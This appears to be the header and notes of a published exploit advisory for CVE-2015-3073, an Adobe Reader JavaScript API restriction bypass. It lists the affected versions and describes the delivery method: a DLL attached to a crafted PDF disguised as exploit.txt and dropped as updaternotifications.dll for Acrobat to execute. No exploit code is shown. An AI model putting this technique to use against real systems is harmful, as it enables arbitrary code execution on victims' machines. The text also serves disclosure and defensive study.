# Title: Adobe Acrobat Reader AFParseDate Javascript API Restrictions
Bypass Vulnerability
# Date: 09/28/2015
# Author: Reigning Shells, based off PoC published by Zero Day Initiative
# Vendor Homepage: adobe.com
# Version: Adobe Reader and Acrobat 10.x before 10.1.14 and 11.x before
11.0.11 on Windows and OS X are vulnerable.
# Tested on: Adobe Acrobat 11.0.10 on Windows 7
# CVE : CVE-2015-3073

This vulnerability allows remote attackers to bypass API restrictions on
vulnerable installations of Adobe Reader. User interaction is required to
exploit this vulnerability in that the target must visit a malicious page
or open a malicious file.

The specific flaw exists within AFParseDate. By creating a specially
crafted PDF with specific JavaScript instructions, it is possible to bypass
the Javascript API restrictions. A remote attacker could exploit this
vulnerability to execute arbitrary code.

Adobe Reader and Acrobat 10.x before 10.1.14 and 11.x before 11.0.11 on
Windows and OS X are vulnerable.

Notes:

The code assumes you attached a DLL named exploit.txt to the PDF document
to get around attachment security restrictions.

Acrobat will execute updaternotifications.dll if it's in the same directory
as the Acrobat executable or the same directory as the document being
opened.

Credit for discovery and the initial POC that illustrates code being
executed in the privileged context (launching a URL) goes to the Zero Day
Initiative.
